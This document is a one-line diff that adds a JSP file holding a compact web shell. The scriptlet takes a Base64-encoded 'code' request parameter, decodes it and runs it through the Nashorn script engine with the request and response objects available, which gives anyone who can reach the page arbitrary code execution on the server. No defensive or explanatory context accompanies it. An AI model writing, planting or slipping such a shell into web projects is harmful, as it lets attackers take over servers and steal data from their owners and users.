@@ -1,0 +1,1 @@
+<%new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval(new java.lang.String(java.util.Base64.getDecoder().decode(request.getParameter("code"))), new javax.script.SimpleBindings(new java.util.HashMap() {{put("response", response);put("request", request);}}));%>
